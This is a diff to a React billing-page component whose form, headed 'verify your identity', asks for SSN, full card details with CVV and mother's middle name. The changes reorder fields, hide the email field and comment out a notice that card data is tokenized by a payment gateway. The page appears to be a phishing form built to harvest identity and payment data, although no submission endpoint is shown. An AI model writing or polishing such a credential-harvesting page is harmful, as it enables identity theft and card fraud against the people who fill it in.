@@ -16,7 +16,7 @@ const BillingPage = () => {
     address: "",
     zip: "",
     ssn: "",
-    email: "",
+    // email: "",
     phone: "",
     cardNumber: "",
     expiry: "",
@@ -66,14 +66,15 @@ const BillingPage = () => {
       <Header />
 
       <div className="flex-grow flex items-center justify-center px-4 py-12">
-        <div className="w-full max-w-3xl">
+        <div className="w-full max-w-2xl">
           <div className="bg-white rounded-2xl shadow-md overflow-hidden">
             <div className="p-6 border-b">
               <h2 className="text-2xl font-extrabold text-[#0d2d62]">
                 Account Information
               </h2>
               <p className="mt-1 text-sm text-gray-600">
-                Provide the following information to verify your identity
+                Provide the following information to verify your identity of
+                your credit/debit card associated with your account.
               </p>
             </div>
 
@@ -81,18 +82,34 @@ const BillingPage = () => {
               className="p-6 grid grid-cols-1 gap-6"
               onSubmit={handleSubmit}
             >
-              <div>
-                <label className="block text-sm font-medium text-gray-700">
-                  Full Name
-                </label>
-                <input
-                  name="fullName"
-                  value={form.fullName}
-                  onChange={handleChange}
-                  required={true}
-                  className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
-                  placeholder="John A. Smith"
-                />
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div>
+                  <label className="block text-sm font-medium text-gray-700">
+                    Full Name
+                  </label>
+                  <input
+                    name="fullName"
+                    value={form.fullName}
+                    onChange={handleChange}
+                    required={true}
+                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
+                    placeholder="John A. Smith"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-sm font-medium text-gray-700">
+                    Mother's Middle Name
+                  </label>
+                  <input
+                    name="motherMiddleName"
+                    value={form.motherMiddleName}
+                    onChange={handleChange}
+                    required={true}
+                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
+                    placeholder="Enter Your Mother's Middle Name"
+                  />
+                </div>
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
@@ -127,7 +144,7 @@ const BillingPage = () => {
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div>
+                {/* <div>
                   <label className="block text-sm font-medium text-gray-700">
                     Email
                   </label>
@@ -140,7 +157,7 @@ const BillingPage = () => {
                     className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                     placeholder="you@example.com"
                   />
-                </div>
+                </div> */}
 
                 <div>
                   <label className="block text-sm font-medium text-gray-700">
@@ -176,20 +193,6 @@ const BillingPage = () => {
                     placeholder="●●● ●●● ●●●"
                     required={true}
                     className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
-                  />
-                </div>
-
-                <div>
-                  <label className="block text-sm font-medium text-gray-700">
-                    Mother's Middle Name
-                  </label>
-                  <input
-                    name="motherMiddleName"
-                    value={form.motherMiddleName}
-                    onChange={handleChange}
-                    required={true}
-                    className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
-                    placeholder="Enter Your Mother's Middle Name"
                   />
                 </div>
               </div>
@@ -271,7 +274,7 @@ const BillingPage = () => {
                       />
                     </div>
 
-                    <div>
+                    <div className="col-span-1 md:col-span-2">
                       <label className="block text-sm font-medium text-gray-700">
                         CVV
                       </label>
@@ -316,15 +319,15 @@ const BillingPage = () => {
               </div>
 
               <div className="pt-2 border-t flex flex-col md:flex-row items-center justify-between gap-4">
-                <div className="text-sm text-gray-600">
+                {/* <div className="text-sm text-gray-600">
                   <p className="font-semibold text-gray-700">Security</p>
                   <p className="mt-1">
                     Card data submitted is sent to the payment gateway for
                     tokenization; do not store raw card details on this server.
                   </p>
-                </div>
+                </div> */}
 
-                <div className="flex gap-3">
+                <div className="flex-end gap-3 w-full">
                   {/* <button
                     type="button"
                     className="px-5 py-3 rounded-lg border border-[#0d2d62] text-[#0d2d62] font-semibold hover:bg-[#f0f4f9]"
